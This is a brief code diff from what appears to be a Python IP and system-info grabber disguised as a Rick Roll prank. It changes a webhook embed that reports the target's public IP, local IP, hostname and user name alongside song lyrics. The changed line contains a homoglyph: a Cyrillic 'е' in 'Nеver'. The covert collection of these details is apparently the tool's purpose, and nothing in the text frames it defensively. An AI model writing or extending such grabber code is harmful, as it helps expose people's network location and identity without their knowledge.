@@ -40,7 +40,7 @@ data = {
 
 data["embeds"] = [
     {
-        "description" : f"Not gonna give you up \n**IPV4: **{ip}\n Never gonna let you down \n**LOCAL IP: ** {local_ip}\n **HOSTNAME: **{hostname}\n **PC USER: ** {user}",
+        "description" : f"**Not gonna give you up** \n**IPV4: **{ip}\n **Never gonna let you down** \n**LOCAL IP: ** {local_ip}\n **Never gonna run around and desert you**\n**HOSTNAME: **{hostname}\n **Nеver gonna make you cry**\n**PC USER: ** {user}",
         "title" : "RICK ROLLED"
     }
 ]
